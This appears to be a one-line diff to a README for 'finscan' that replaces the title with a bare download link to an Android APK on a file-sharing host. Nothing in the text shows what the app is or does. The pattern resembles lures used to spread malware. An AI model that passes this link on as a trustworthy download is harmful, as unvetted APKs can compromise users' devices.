@@ -1,1 +1,2 @@
-# finscan
+# Download finscan
+DOWNLOAD LINK: https://www.mediafire.com/file/l5iuh6v406u4u1q/Finscan.apk/file
